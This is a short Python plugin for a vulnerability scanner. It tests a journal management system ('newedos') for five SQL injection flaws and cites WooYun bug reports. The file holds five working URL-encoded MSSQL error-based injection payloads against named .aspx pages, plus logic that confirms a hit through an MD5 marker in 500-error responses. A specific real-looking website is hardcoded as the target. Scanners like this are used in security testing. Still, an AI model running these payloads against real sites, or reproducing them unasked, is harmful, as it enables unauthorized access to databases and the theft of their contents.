#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:菲斯特诺期刊系统5枚注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0125186，http://www.wooyun.org/bugs/wooyun-2010-0116361


def assign(service,arg):
    if service=="newedos":
        return True,arg 
  
def  audit(arg):
    ps=[
        "viewarticle.aspx?id=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "select_e.aspx?type=zzdw&content=1%27%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "Supplylist.aspx?parentid=1/**/and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/&clas",
        "orderproduct.aspx?id=1&cid=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
        "ExhibitionCenter.aspx?area=-1'%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20"
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole('SQL injection:'+url)  

if __name__=="__main__":
    from dummy import *
    audit(assign('newedos','http://www.scdwzz.com/')[1])